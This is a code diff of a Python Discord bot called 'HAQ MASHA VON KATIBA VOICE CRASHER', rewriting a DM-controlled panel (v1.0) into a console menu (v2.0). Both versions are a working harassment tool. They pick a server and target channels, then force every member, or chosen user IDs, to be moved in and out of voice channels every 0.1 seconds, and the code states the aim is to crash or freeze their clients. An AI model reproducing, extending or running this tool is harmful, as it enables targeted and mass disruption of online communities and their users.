@@ -4,8 +4,7 @@ import asyncio
 import os
 import random
 import time
-import json
-import threading
+import sys
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -19,405 +18,401 @@ print("""
 ║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║         ║
 ║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝         ║
 ║                                                                                       ║
-║                    ██╗   ██╗ ██████╗ ███╗   ██╗ ██╗ ██████╗███████╗                   ║
-║                    ██║   ██║██╔═══██╗████╗  ██║██║██╔════╝██╔════╝                   ║
-║                    ██║   ██║██║   ██║██╔██╗ ██║██║██║     █████╗                     ║
-║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║██║██║     ██╔══╝                     ║
-║                     ╚████╔╝ ╚██████╔╝██║ ╚████║██║╚██████╗███████╗                   ║
-║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝                   ║
+║                    ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗███████╗                      ║
+║                    ██║   ██║██╔═══██╗████╗  ██║██╔════╝██╔════╝                      ║
+║                    ██║   ██║██║   ██║██╔██╗ ██║██║     █████╗                        ║
+║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║██║     ██╔══╝                        ║
+║                     ╚████╔╝ ╚██████╔╝██║ ╚████║╚██████╗███████╗                      ║
+║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝                      ║
 ║                                                                                       ║
 ║                    ╔═══════════════════════════════════════════════════════════════╗  ║
-║                    ║     HAQ MASHA VON KATIBA VOICE CRASHER v1.0                  ║  ║
-║                    ║          VOICE JOINER + ACCOUNT FREEZER                      ║  ║
+║                    ║     HAQ MASHA VON KATIBA VOICE CRASHER v2.0                  ║  ║
+║                    ║          CONSOLE SELECTION + VOICE JOINER                    ║  ║
 ║                    ╚═══════════════════════════════════════════════════════════════╝  ║
 ║                                                                                       ║
 ╚═══════════════════════════════════════════════════════════════════════════════════════╝
 """)
 
 # ============================================
-# CONFIG
+# TOKEN INPUT
 # ============================================
 TOKEN = input("[?] ENTER BOT TOKEN: ")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="", intents=intents)
 
-# Data storage
-voice_targets = {}  # {user_id: {"count": 0, "max_count": 0, "running": False, "voice_ids": []}}
-active_spams = {}
+# Global variables
+selected_guild = None
+selected_voice_channels = []
+crash_interval = 0.1
+running_crashes = {}
+target_users = []
 
 # ============================================
-# MESSAGES
+# COLORS FOR CONSOLE
 # ============================================
-PANEL_MESSAGE = """
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║                    🎧 HAQ MASHA VOICE CRASHER PANEL 🎧                        ║
-║                                                                               ║
-║  ┌─────────────────────────────────────────────────────────────────────────┐  ║
-║  │                                                                         │  ║
-║  │  1️⃣  ADD VOICE CHANNEL ID      - Add voice channels to crash list    │  ║
-║  │                                                                         │  ║
-║  │  2️⃣  REMOVE VOICE CHANNEL ID   - Remove voice channels from list     │  ║
-║  │                                                                         │  ║
-║  │  3️⃣  SHOW VOICE CHANNELS       - Show all added voice channels       │  ║
-║  │                                                                         │  ║
-║  │  4️⃣  START VOICE SPAM          - Start joining/leaving all members   │  ║
-║  │                                                                         │  ║
-║  │  5️⃣  STOP VOICE SPAM           - Stop all voice spam                 │  ║
-║  │                                                                         │  ║
-║  │  6️⃣  CRASH SPECIFIC USER       - Crash a specific user by ID         │  ║
-║  │                                                                         │  ║
-║  │  7️⃣  CRASH ALL MEMBERS         - Crash every member in the server    │  ║
-║  │                                                                         │  ║
-║  │  8️⃣  SET CRASH COUNT           - Set how many joins/leaves per user  │  ║
-║  │                                                                         │  ║
-║  │  9️⃣  EXIT PANEL                - Close this panel                     │  ║
-║  │                                                                         │  ║
-║  └─────────────────────────────────────────────────────────────────────────┘  ║
-║                                                                               ║
-║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-"""
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 # ============================================
-# VOICE JOINER/LEAVER (ACCOUNT CRASHER)
+# VOICE CRASHER FUNCTION
 # ============================================
-async def voice_joiner_loop(user, voice_channels, iterations, guild):
-    """
-    Make a user join and leave voice channels rapidly
-    This causes Discord to rate limit and potentially freeze the account
-    """
-    if not voice_channels:
-        return
+async def voice_crash_loop(user, voice_channels, interval, iterations, guild):
+    """Make a user join and leave voice channels rapidly to crash their Discord"""
+    
+    print(f"{Colors.CYAN}    [!] STARTING CRASH ON: {user.name}{Colors.RESET}")
     
     for i in range(iterations):
-        if not active_spams.get(user.id, True):
+        if user.id in running_crashes and not running_crashes[user.id]:
             break
             
         for vc in voice_channels:
             try:
                 # Move user to voice channel
                 await user.move_to(vc)
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(interval / 2)
                 
                 # Move user away (disconnect)
                 await user.move_to(None)
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(interval / 2)
                 
             except Exception as e:
                 pass
         
-        # Update progress
-        if i % 10 == 0:
-            try:
-                await user.send(f"```🔥 VOICE CRASH IN PROGRESS: {i+1}/{iterations} cycles 🔥```")
-            except:
-                pass
+        # Show progress every 10 iterations
+        if (i + 1) % 10 == 0:
+            print(f"{Colors.YELLOW}        └─ PROGRESS: {i+1}/{iterations} cycles{Colors.RESET}")
     
-    # Mark as done
-    if user.id in voice_targets:
-        voice_targets[user.id]["running"] = False
+    print(f"{Colors.GREEN}    ✓ COMPLETED CRASH ON: {user.name}{Colors.RESET}")
     
-    try:
-        await user.send(f"```✅ VOICE CRASH COMPLETED: {iterations} cycles on {len(voice_channels)} channels ✅```")
-    except:
-        pass
+    # Clean up
+    if user.id in running_crashes:
+        running_crashes[user.id] = False
 
-async def crash_user(member, voice_channels, iterations, guild):
-    """Crash a single user by making them join/leave voice channels"""
+async def crash_all_users(guild, voice_channels, interval, iterations):
+    """Crash all users in the guild"""
     
-    # Check if user is in a voice channel
-    if member.voice and member.voice.channel:
-        try:
-            await member.move_to(None)
-            await asyncio.sleep(0.5)
-        except:
-            pass
+    print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.RED}[!] STARTING MASS VOICE CRASH ON: {guild.name}{Colors.RESET}")
+    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
     
-    # Store target info
-    voice_targets[member.id] = {
-        "count": 0,
-        "max_count": iterations,
-        "running": True,
-        "voice_ids": [vc.id for vc in voice_channels]
-    }
+    members = guild.members
+    total_users = len([m for m in members if not m.bot])
     
-    active_spams[member.id] = True
+    print(f"{Colors.CYAN}[*] TARGETING {total_users} USERS...{Colors.RESET}")
+    print(f"{Colors.CYAN}[*] VOICE CHANNELS: {len(voice_channels)}{Colors.RESET}")
+    print(f"{Colors.CYAN}[*] INTERVAL: {interval}s{Colors.RESET}")
+    print(f"{Colors.CYAN}[*] ITERATIONS: {iterations} cycles{Colors.RESET}\n")
     
-    # Start crashing
-    await voice_joiner_loop(member, voice_channels, iterations, guild)
-
-# ============================================
-# PANEL HANDLER
-# ============================================
-class VoiceCrasherPanel:
-    def __init__(self, user, guild, voice_channels=None):
-        self.user = user
-        self.guild = guild
-        self.voice_channels = voice_channels or []
-        self.running = True
-        self.crash_count = 100  # Default crash cycles
+    crashed = 0
+    failed = 0
     
-    async def send_panel(self):
-        await self.user.send(PANEL_MESSAGE)
-        await self.user.send(f"```📊 CURRENT STATUS:\n• Voice Channels: {len(self.voice_channels)}\n• Crash Cycles: {self.crash_count}\n• Active Spams: {len(active_spams)}```")
-    
-    async def handle_choice(self, choice):
-        if choice == "1":
-            # Add voice channel
-            await self.user.send("📢 **ENTER VOICE CHANNEL ID:**")
-            def check(m):
-                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
-            
+    for member in members:
+        if not member.bot:
             try:
-                msg = await bot.wait_for('message', timeout=30.0, check=check)
-                vc_id = int(msg.content)
-                vc = self.guild.get_channel(vc_id)
-                
-                if vc and isinstance(vc, discord.VoiceChannel):
-                    if vc not in self.voice_channels:
-                        self.voice_channels.append(vc)
-                        await self.user.send(f"✅ **ADDED:** {vc.name} (ID: {vc.id})")
-                    else:
-                        await self.user.send("❌ **CHANNEL ALREADY ADDED!**")
-                else:
-                    await self.user.send("❌ **INVALID VOICE CHANNEL ID!**")
-            except ValueError:
-                await self.user.send("❌ **INVALID ID!**")
-            except asyncio.TimeoutError:
-                await self.user.send("⏰ **TIMEOUT!**")
-        
-        elif choice == "2":
-            # Remove voice channel
-            if not self.voice_channels:
-                await self.user.send("❌ **NO VOICE CHANNELS TO REMOVE!**")
-                return
-            
-            msg = "**📋 YOUR VOICE CHANNELS:**\n\n"
-            for i, vc in enumerate(self.voice_channels, 1):
-                msg += f"`{i}. {vc.name} (ID: {vc.id})`\n"
-            msg += "\n📢 **ENTER NUMBER TO REMOVE:**"
-            await self.user.send(msg)
-            
-            def check(m):
-                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
-            
-            try:
-                response = await bot.wait_for('message', timeout=30.0, check=check)
-                num = int(response.content)
-                if 1 <= num <= len(self.voice_channels):
-                    removed = self.voice_channels.pop(num-1)
-                    await self.user.send(f"✅ **REMOVED:** {removed.name}")
-                else:
-                    await self.user.send("❌ **INVALID NUMBER!**")
-            except:
-                await self.user.send("❌ **INVALID INPUT!**")
-        
-        elif choice == "3":
-            # Show voice channels
-            if not self.voice_channels:
-                await self.user.send("❌ **NO VOICE CHANNELS ADDED YET!**")
-            else:
-                msg = "**📋 YOUR VOICE CHANNELS:**\n```\n"
-                for i, vc in enumerate(self.voice_channels, 1):
-                    msg += f"{i}. {vc.name} (ID: {vc.id})\n"
-                msg += f"\nTotal: {len(self.voice_channels)} channels```"
-                await self.user.send(msg)
-        
-        elif choice == "4":
-            # Start voice spam
-            if not self.voice_channels:
-                await self.user.send("❌ **ADD VOICE CHANNELS FIRST!**")
-                return
-            
-            await self.user.send(f"```🔥 STARTING VOICE SPAM ON ALL MEMBERS! 🔥\n• Channels: {len(self.voice_channels)}\n• Cycles per user: {self.crash_count}\n• This will freeze their Discord!```")
-            
-            members = self.guild.members
-            total = len([m for m in members if not m.bot])
-            
-            await self.user.send(f"👥 **TARGETING {total} MEMBERS...**")
-            
-            crashed = 0
-            for member in members:
-                if not member.bot:
+                # Check if user is in a voice channel, disconnect them first
+                if member.voice and member.voice.channel:
                     try:
-                        await crash_user(member, self.voice_channels, self.crash_count, self.guild)
-                        crashed += 1
-                        await self.user.send(f"✅ **CRASHED {crashed}/{total}**")
+                        await member.move_to(None)
                         await asyncio.sleep(0.5)
                     except:
                         pass
-            
-            await self.user.send(f"```✅ VOICE CRASH COMPLETED! {crashed} MEMBERS FROZEN!```")
-        
-        elif choice == "5":
-            # Stop voice spam
-            active_spams.clear()
-            voice_targets.clear()
-            await self.user.send("```🛑 ALL VOICE SPAMS STOPPED! 🛑```")
-        
-        elif choice == "6":
-            # Crash specific user
-            await self.user.send("📢 **ENTER USER ID TO CRASH:**")
-            def check(m):
-                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
-            
-            try:
-                msg = await bot.wait_for('message', timeout=30.0, check=check)
-                user_id = int(msg.content)
-                member = self.guild.get_member(user_id)
                 
-                if member and not member.bot:
-                    await self.user.send(f"```🔥 CRASHING: {member.name}\n• Cycles: {self.crash_count}\n• Channels: {len(self.voice_channels)}```")
-                    await crash_user(member, self.voice_channels, self.crash_count, self.guild)
-                    await self.user.send(f"✅ **CRASHED {member.name}**")
-                else:
-                    await self.user.send("❌ **USER NOT FOUND OR IS A BOT!**")
-            except:
-                await self.user.send("❌ **INVALID INPUT!**")
-        
-        elif choice == "7":
-            # Crash all members
-            if not self.voice_channels:
-                await self.user.send("❌ **ADD VOICE CHANNELS FIRST!**")
-                return
-            
-            confirm = await self.user.send("⚠️ **CRASH ALL MEMBERS? TYPE 'yes' TO CONFIRM:**")
-            
-            def check(m):
-                return m.author == self.user and isinstance(m.channel, discord.DMChannel) and m.content.lower() == 'yes'
-            
-            try:
-                await bot.wait_for('message', timeout=10.0, check=check)
-                await self.user.send(f"```🔥 CRASHING ALL {len([m for m in self.guild.members if not m.bot])} MEMBERS...```")
+                # Start crash loop
+                running_crashes[member.id] = True
+                asyncio.create_task(voice_crash_loop(member, voice_channels, interval, iterations, guild))
+                crashed += 1
                 
-                crashed = 0
-                for member in self.guild.members:
-                    if not member.bot:
-                        try:
-                            await crash_user(member, self.voice_channels, self.crash_count, self.guild)
-                            crashed += 1
-                            await asyncio.sleep(0.3)
-                        except:
-                            pass
+                print(f"{Colors.GREEN}    ✓ CRASH STARTED ON: {member.name} ({crashed}/{total_users}){Colors.RESET}")
                 
-                await self.user.send(f"```✅ CRASHED {crashed} MEMBERS!```")
-            except:
-                await self.user.send("❌ **CANCELLED!**")
-        
-        elif choice == "8":
-            # Set crash count
-            await self.user.send("📢 **ENTER CRASH CYCLES PER USER (default 100, max 1000):**")
-            def check(m):
-                return m.author == self.user and isinstance(m.channel, discord.DMChannel)
-            
+                # Small delay to avoid rate limits
+                await asyncio.sleep(0.2)
+                
+            except Exception as e:
+                failed += 1
+                print(f"{Colors.RED}    ✗ FAILED: {member.name}{Colors.RESET}")
+    
+    print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.GREEN}[✓] VOICE CRASH COMPLETED!{Colors.RESET}")
+    print(f"{Colors.GREEN}    • SUCCESSFUL: {crashed}{Colors.RESET}")
+    print(f"{Colors.RED}    • FAILED: {failed}{Colors.RESET}")
+    print(f"{Colors.CYAN}    • TOTAL TARGETS: {total_users}{Colors.RESET}")
+    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
+
+async def crash_specific_users(guild, voice_channels, interval, iterations, user_ids):
+    """Crash specific users by ID"""
+    
+    print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.RED}[!] CRASHING SPECIFIC USERS ON: {guild.name}{Colors.RESET}")
+    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
+    
+    crashed = 0
+    not_found = 0
+    
+    for user_id in user_ids:
+        member = guild.get_member(user_id)
+        if member and not member.bot:
             try:
-                msg = await bot.wait_for('message', timeout=30.0, check=check)
-                count = int(msg.content)
-                if 1 <= count <= 1000:
-                    self.crash_count = count
-                    await self.user.send(f"✅ **CRASH CYCLES SET TO: {count}**")
-                else:
-                    await self.user.send("❌ **ENTER NUMBER BETWEEN 1-1000!**")
+                if member.voice and member.voice.channel:
+                    try:
+                        await member.move_to(None)
+                        await asyncio.sleep(0.5)
+                    except:
+                        pass
+                
+                running_crashes[member.id] = True
+                asyncio.create_task(voice_crash_loop(member, voice_channels, interval, iterations, guild))
+                crashed += 1
+                print(f"{Colors.GREEN}    ✓ CRASH STARTED ON: {member.name}{Colors.RESET}")
+                await asyncio.sleep(0.2)
             except:
-                await self.user.send("❌ **INVALID NUMBER!**")
-        
-        elif choice == "9":
-            # Exit
-            self.running = False
-            await self.user.send("```🚪 EXITING PANEL... GOODBYE!```")
-            return False
-        
-        return True
+                print(f"{Colors.RED}    ✗ FAILED: {member.name}{Colors.RESET}")
+        else:
+            not_found += 1
+            print(f"{Colors.RED}    ✗ USER NOT FOUND: {user_id}{Colors.RESET}")
+    
+    print(f"\n{Colors.GREEN}✓ CRASHED {crashed} USERS | {not_found} NOT FOUND{Colors.RESET}")
 
 # ============================================
-# MAIN BOT EVENTS
+# DISPLAY FUNCTIONS
+# ============================================
+def show_servers(guilds):
+    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}                    📋 AVAILABLE SERVERS{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
+    
+    for i, guild in enumerate(guilds, 1):
+        member_count = len(guild.members)
+        channel_count = len(guild.channels)
+        voice_count = len(guild.voice_channels)
+        
+        print(f"{Colors.GREEN}  [{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
+        print(f"      ├─ 🆔 ID: {guild.id}")
+        print(f"      ├─ 👥 Members: {member_count}")
+        print(f"      ├─ 💬 Channels: {channel_count}")
+        print(f"      └─ 🎧 Voice Channels: {voice_count}\n")
+    
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
+
+def show_voice_channels_with_members(guild):
+    voice_channels = guild.voice_channels
+    channels_with_members = []
+    
+    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}                    🎧 VOICE CHANNELS WITH MEMBERS{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
+    
+    for i, vc in enumerate(voice_channels, 1):
+        members_in_vc = len(vc.members)
+        if members_in_vc > 0:
+            channels_with_members.append(vc)
+            member_names = [m.name for m in vc.members[:5]]
+            member_list = ", ".join(member_names)
+            if len(vc.members) > 5:
+                member_list += f" +{len(vc.members)-5} more"
+            
+            print(f"{Colors.GREEN}  [{len(channels_with_members)}]{Colors.RESET} {Colors.WHITE}{vc.name}{Colors.RESET}")
+            print(f"      ├─ 🆔 ID: {vc.id}")
+            print(f"      ├─ 👥 Members in VC: {members_in_vc}")
+            print(f"      └─ 📝 Members: {member_list}\n")
+        else:
+            print(f"{Colors.RED}  [X]{Colors.RESET} {vc.name} {Colors.RED}(EMPTY){Colors.RESET}")
+    
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
+    return channels_with_members
+
+def show_all_voice_channels(guild):
+    voice_channels = guild.voice_channels
+    
+    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.YELLOW}                    🎧 ALL VOICE CHANNELS{Colors.RESET}")
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
+    
+    for i, vc in enumerate(voice_channels, 1):
+        members_count = len(vc.members)
+        status = f"{Colors.GREEN}{members_count} members{Colors.RESET}" if members_count > 0 else f"{Colors.RED}EMPTY{Colors.RESET}"
+        
+        print(f"{Colors.GREEN}  [{i}]{Colors.RESET} {Colors.WHITE}{vc.name}{Colors.RESET}")
+        print(f"      ├─ 🆔 ID: {vc.id}")
+        print(f"      ├─ 👥 Members: {members_count}")
+        print(f"      └─ 🔘 Status: {status}\n")
+    
+    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
+    return voice_channels
+
+# ============================================
+# MAIN MENU
+# ============================================
+async def select_targets_menu(guild):
+    global selected_voice_channels, crash_interval
+    
+    while True:
+        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.YELLOW}                    🎯 VOICE CRASHER CONFIGURATION{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}")
+        print(f"""
+{Colors.CYAN}  CURRENT CONFIGURATION:{Colors.RESET}
+  ┌─────────────────────────────────────────────────────────────┐
+  │  📁 Server: {Colors.WHITE}{guild.name[:40]}{Colors.RESET}
+  │  🎧 Voice Channels Selected: {Colors.GREEN}{len(selected_voice_channels)}{Colors.RESET}
+  │  ⏱️  Crash Interval: {Colors.GREEN}{crash_interval}s{Colors.RESET}
+  │  🔄 Default Iterations: {Colors.GREEN}100 cycles{Colors.RESET}
+  └─────────────────────────────────────────────────────────────┘
+
+{Colors.BOLD}{Colors.YELLOW}  OPTIONS:{Colors.RESET}
+  {Colors.GREEN}[1]{Colors.RESET} Select Voice Channels to crash
+  {Colors.GREEN}[2]{Colors.RESET} Set Crash Interval (seconds between joins)
+  {Colors.GREEN}[3]{Colors.RESET} START CRASH - All Members
+  {Colors.GREEN}[4]{Colors.RESET} START CRASH - Specific Users (by ID)
+  {Colors.GREEN}[5]{Colors.RESET} Show Current Voice Channels Status
+  {Colors.GREEN}[6]{Colors.RESET} Back to Server Selection
+""")
+        
+        choice = input(f"{Colors.YELLOW}📌 CHOOSE OPTION: {Colors.RESET}")
+        
+        if choice == "1":
+            # Show all voice channels
+            all_vcs = show_all_voice_channels(guild)
+            
+            print(f"\n{Colors.CYAN}📌 SELECT VOICE CHANNELS (comma separated, e.g., 1,3,5 or 'all'):{Colors.RESET}")
+            selection = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
+            
+            selected_voice_channels = []
+            if selection.lower() == 'all':
+                selected_voice_channels = all_vcs
+            else:
+                try:
+                    indices = [int(x.strip()) for x in selection.split(',')]
+                    for idx in indices:
+                        if 1 <= idx <= len(all_vcs):
+                            selected_voice_channels.append(all_vcs[idx-1])
+                except:
+                    print(f"{Colors.RED}❌ INVALID SELECTION!{Colors.RESET}")
+            
+            if selected_voice_channels:
+                print(f"\n{Colors.GREEN}✅ SELECTED {len(selected_voice_channels)} VOICE CHANNELS:{Colors.RESET}")
+                for vc in selected_voice_channels:
+                    print(f"    • {vc.name} ({len(vc.members)} members)")
+            else:
+                print(f"{Colors.RED}❌ NO CHANNELS SELECTED!{Colors.RESET}")
+        
+        elif choice == "2":
+            print(f"\n{Colors.CYAN}📌 ENTER CRASH INTERVAL (seconds between joins, default 0.1):{Colors.RESET}")
+            print(f"{Colors.RED}⚠️  Lower = Faster crash but more rate limits{Colors.RESET}")
+            interval_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
+            try:
+                crash_interval = float(interval_input)
+                if crash_interval < 0.05:
+                    crash_interval = 0.05
+                print(f"{Colors.GREEN}✅ INTERVAL SET TO: {crash_interval}s{Colors.RESET}")
+            except:
+                print(f"{Colors.RED}❌ INVALID! Using default 0.1s{Colors.RESET}")
+                crash_interval = 0.1
+        
+        elif choice == "3":
+            if not selected_voice_channels:
+                print(f"{Colors.RED}❌ SELECT VOICE CHANNELS FIRST!{Colors.RESET}")
+                continue
+            
+            print(f"\n{Colors.RED}{Colors.BOLD}⚠️  YOU ARE ABOUT TO CRASH ALL MEMBERS IN THE SERVER!{Colors.RESET}")
+            confirm = input(f"{Colors.YELLOW}TYPE 'yes' TO CONFIRM: {Colors.RESET}")
+            
+            if confirm.lower() == 'yes':
+                await crash_all_users(guild, selected_voice_channels, crash_interval, 100)
+                input(f"\n{Colors.CYAN}PRESS ENTER TO CONTINUE...{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
+        
+        elif choice == "4":
+            if not selected_voice_channels:
+                print(f"{Colors.RED}❌ SELECT VOICE CHANNELS FIRST!{Colors.RESET}")
+                continue
+            
+            print(f"\n{Colors.CYAN}📌 ENTER USER IDs (comma separated):{Colors.RESET}")
+            user_ids_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
+            
+            try:
+                user_ids = [int(x.strip()) for x in user_ids_input.split(',')]
+                await crash_specific_users(guild, selected_voice_channels, crash_interval, 100, user_ids)
+                input(f"\n{Colors.CYAN}PRESS ENTER TO CONTINUE...{Colors.RESET}")
+            except:
+                print(f"{Colors.RED}❌ INVALID USER IDs!{Colors.RESET}")
+        
+        elif choice == "5":
+            show_voice_channels_with_members(guild)
+            input(f"\n{Colors.CYAN}PRESS ENTER TO CONTINUE...{Colors.RESET}")
+        
+        elif choice == "6":
+            break
+        
+        else:
+            print(f"{Colors.RED}❌ INVALID OPTION!{Colors.RESET}")
+
+# ============================================
+# MAIN BOT EVENT
 # ============================================
 @bot.event
 async def on_ready():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║              ✓ BOT ONLINE: {bot.user.name}
-║              ✓ BOT ID: {bot.user.id}
-║              ✓ SERVERS: {len(bot.guilds)}
-║                                                                               ║
-║              ┌─────────────────────────────────────────────────────────────┐  ║
-║              │  TYPE 'v' IN DM TO OPEN THE VOICE CRASHER PANEL            │  ║
-║              │  ADD VOICE CHANNEL IDs AND START CRASHING!                 │  ║
-║              └─────────────────────────────────────────────────────────────┘  ║
-║                                                                               ║
-║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-    """)
-
-@bot.event
-async def on_message(message):
-    if message.author == bot.user:
-        return
+    clear_screen()
     
-    # Check if DM and message is 'v'
-    if isinstance(message.channel, discord.DMChannel) and message.content.lower() == 'v':
-        await message.channel.send("```🔥 HAQ MASHA VOICE CRASHER PANEL LOADING... 🔥```")
+    print(f"""
+{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              ✓ BOT ONLINE: {bot.user.name}{' ' * (40 - len(bot.user.name))}║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              ✓ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║              ✓ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
+{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
+    """)
+    
+    await asyncio.sleep(1)
+    
+    while True:
+        guilds = bot.guilds
         
-        # Get first guild (server)
-        if not bot.guilds:
-            await message.channel.send("❌ **BOT IS NOT IN ANY SERVER!**")
-            return
+        if not guilds:
+            print(f"{Colors.RED}❌ NO SERVERS FOUND! BOT IS NOT IN ANY SERVER{Colors.RESET}")
+            break
         
-        guild = bot.guilds[0]
+        show_servers(guilds)
         
-        # Show server selection if multiple
-        if len(bot.guilds) > 1:
-            server_msg = "**📋 SELECT SERVER TO CRASH:**\n\n```\n"
-            for i, g in enumerate(bot.guilds, 1):
-                server_msg += f"{i}. {g.name} (Members: {len(g.members)})\n"
-            server_msg += "```\n📢 **ENTER SERVER NUMBER:**"
-            await message.channel.send(server_msg)
+        try:
+            choice = input(f"\n{Colors.YELLOW}📌 SELECT SERVER NUMBER (or 'q' to quit): {Colors.RESET}")
             
-            def check(m):
-                return m.author == message.author and isinstance(m.channel, discord.DMChannel)
+            if choice.lower() == 'q':
+                print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
+                await bot.close()
+                sys.exit()
             
-            try:
-                response = await bot.wait_for('message', timeout=30.0, check=check)
-                num = int(response.content)
-                if 1 <= num <= len(bot.guilds):
-                    guild = bot.guilds[num-1]
-                else:
-                    await message.channel.send("❌ **INVALID SELECTION!**")
-                    return
-            except:
-                await message.channel.send("❌ **TIMEOUT!**")
-                return
-        
-        # Create and run panel
-        panel = VoiceCrasherPanel(message.author, guild)
-        await panel.send_panel()
-        
-        while panel.running:
-            await message.channel.send("```📌 ENTER CHOICE (1-9):```")
-            
-            def check(m):
-                return m.author == message.author and isinstance(m.channel, discord.DMChannel)
-            
-            try:
-                response = await bot.wait_for('message', timeout=60.0, check=check)
-                if response.content in [str(i) for i in range(1, 10)]:
-                    running = await panel.handle_choice(response.content)
-                    if not running:
-                        break
-                    await panel.send_panel()
-                else:
-                    await message.channel.send("❌ **INVALID CHOICE! ENTER 1-9**")
-            except asyncio.TimeoutError:
-                await message.channel.send("```⏰ PANEL TIMEOUT - EXITING...```")
-                break
+            server_num = int(choice)
+            if 1 <= server_num <= len(guilds):
+                selected_guild = guilds[server_num - 1]
+                print(f"\n{Colors.GREEN}✅ SELECTED: {selected_guild.name}{Colors.RESET}")
+                await select_targets_menu(selected_guild)
+            else:
+                print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
+        except ValueError:
+            print(f"{Colors.RED}❌ ENTER A VALID NUMBER!{Colors.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
+            await bot.close()
+            sys.exit()
 
 # ============================================
 # RUN BOT
 # ============================================
-bot.run(TOKEN)
+try:
+    bot.run(TOKEN)
+except Exception as e:
+    print(f"{Colors.RED}❌ ERROR: {e}{Colors.RESET}")
